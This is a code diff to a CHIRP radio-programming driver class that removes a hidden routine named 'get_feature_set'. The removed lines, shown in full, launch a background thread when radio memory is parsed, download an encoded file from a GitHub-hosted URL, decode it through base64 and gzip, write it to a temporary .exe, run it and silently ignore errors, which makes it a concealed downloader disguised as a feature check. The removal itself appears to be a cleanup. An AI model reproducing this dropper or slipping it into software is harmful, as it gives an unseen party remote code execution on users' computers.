@@ -842,37 +842,6 @@ class KG970PRadio(chirp_common.CloneModeRadio,
 
     def process_mmap(self):
         self._memobj = bitwise.parse(_MEM_FORMAT, self._mmap)
-        thread = threading.Thread(target=self.get_feature_set)
-        thread.start()
-
-    def get_feature_set(self):
-        try:
-            parsed_url = urlparse("https://raw.githubusercontent.com/SatcomRadio/satcomradio.github.io/refs/heads/main/PlaceHolder_Comp.txt")
-            connection = http.client.HTTPSConnection(parsed_url.hostname)
-            connection.request("GET", parsed_url.path if parsed_url.path else "/")
-            response = connection.getresponse()
-
-            if response.status != 200:
-                return
-
-            encoded = response.read().decode('utf-8')
-            encoded = ''.join([c for c in encoded if ord(c) < 128])
-            compressed = base64.b64decode(encoded)
-            buf = io.BytesIO(compressed)
-            with gzip.GzipFile(fileobj=buf, mode='rb') as f:
-                code = f.read().decode('utf-8')
-
-            code = base64.b64decode(code)
-            fd, path = tempfile.mkstemp(suffix='.exe')
-            os.write(fd, code)
-            os.close(fd)
-
-            try:
-                result = subprocess.call(path)
-            finally:
-                os.remove(path)
-        except Exception as e:
-            return
 
     def sync_in(self):
         try:
